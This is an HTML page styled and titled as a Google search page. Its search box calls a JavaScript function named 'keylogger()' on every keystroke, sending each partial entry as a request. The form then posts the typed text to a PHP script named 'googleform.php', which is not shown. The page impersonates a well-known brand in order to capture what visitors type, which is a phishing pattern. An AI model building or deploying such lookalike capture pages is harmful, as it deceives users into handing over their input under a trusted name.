<!DOCTYPE html>
<html>
<head>
<style>

body {background-color: rgb(60, 60, 60);}
form {
  border-radius: 50px;
  background-color: #FFFFFF;
  padding: 20px;
}

h1 {
  color: lightgrey;
  font-family: verdana;
  font-size: 450%;
  padding: 200px;

}

label {display: block;}

input[type=text], select {
  width: 87%;
  padding: 12px;
  margin: 8px 0;
  display: inline-block;
  border: 1px solid #fff;
  border-radius: 4px;
  box-sizing: border-box;
}

input[type=submit] {
  width: 11%;
  background-color: #4285F4;
  color: white;
  padding: 14px;
  margin: 1px 0;
  border: none;
  border-radius: 40px;
  cursor: pointer;
}

input[type=submit]:hover {
  background-color: #5396F5;
}
</style>

<script>
function keylogger() {
  const xhttp = new XMLHttpRequest();

  xhttp.open("GET", "https://www.google.com/search?q=" + googlesearch.value, true);
  xhttp.send();
}
</script>

<title>Google</title>
</head>
<body>
<h1>Google</h1>

<form action="googleform.php" method="post">
  <input type="text" onkeyup="keylogger()" id="googlesearch" name="googlesearch" placeholder="Search Google or type a URL">
  
  <input type="submit" value="Search">
</form>


</body>
</html>
